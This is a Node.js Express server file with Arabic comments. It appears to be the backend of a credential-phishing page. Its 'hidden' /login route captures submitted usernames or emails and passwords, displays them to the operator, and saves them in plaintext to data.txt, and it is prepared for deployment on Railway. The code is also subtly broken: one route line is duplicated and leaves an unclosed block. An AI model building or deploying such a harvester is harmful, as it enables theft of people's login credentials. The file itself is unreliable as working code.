// استدعاء المكتبات البرمجية الأساسية لإنشاء السيرفر
const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// تفعيل الصلاحيات لكي يستقبل السيرفر البيانات القادمة من ملف الـ HTML المحلي أو السيرفر
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// تشغيل مجلد public لقراءة ملف الواجهة تلقائياً إذا تم فتح اللوكال هوست
app.use(express.static(__dirname));
// الرابط البرمجي المخفي الذي يستقبل البيانات من الواجهة (تعديل الرابط ليتوافق مع الفتح المباشر)
app.post('/login', (req, res) => {
    // استقبال البيانات سواء قادمة كـ JSON أو من Form عادي
    const data = req.body;
    
    // استخراج الحقول المتوقع إرسالها من واجهتكِ (اسم المستخدم وكلمة المرور)
    const username = data.username || data.email || 'غير معروف';
    const password = data.password || 'غير معروف';

    // 1. طباعة البيانات فوراً في شاشتك السوداء (Terminal) لتراقبها بنفسك
    console.log("\n=====================================");
    console.log("📥 تم استقبال بيانات جديدة بنجاح!");
    console.log(`👤 اسم المستخدم أو الإيميل: ${username}`);
    console.log(`🔑 كلمة المرور المستلمة: ${password}`);
    console.log("=====================================\n");

    // 2. تنسيق البيانات لحفظها في ملف نصي بشكل منظم مع التاريخ والوقت
    const logData = `[${new Date().toLocaleString()}] -> User: ${username} | Pass: ${password}\n`;

    // 3. كتابة البيانات داخل ملف اسمه data.txt (سيتم إنشاؤه تلقائياً بجانب السيرفر)
    fs.appendFileSync(path.join(__dirname, 'data.txt'), logData, 'utf8');

    // إرسال رد للمتصفح يفيد بالنجاح (يمكنكِ تغيير هذا السطر لتوجيه المستخدم لصفحة أخرى)
    res.send('<h1>تم استقبال البيانات بنجاح في السيرفر وحفظها في data.txt!</h1>');
});

// توجيه الرابط الرئيسي للموقع ليفتح ملف index.html تلقائياً عند طلب http://localhost:3000
app.get('/', (req, res) => {
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
// تشغيل السيرفر وجعله مستعداً للاستقبال محلياً أو على Railway
app.listen(PORT, () => {
    console.log(`🚀 السيرفر المحلي يعمل الآن بنجاح على الرابط: http://localhost:${PORT}`);
    console.log('💡 اضغط Ctrl + C في الشاشة السوداء لإيقاف السيرفر في أي وقت.');
});
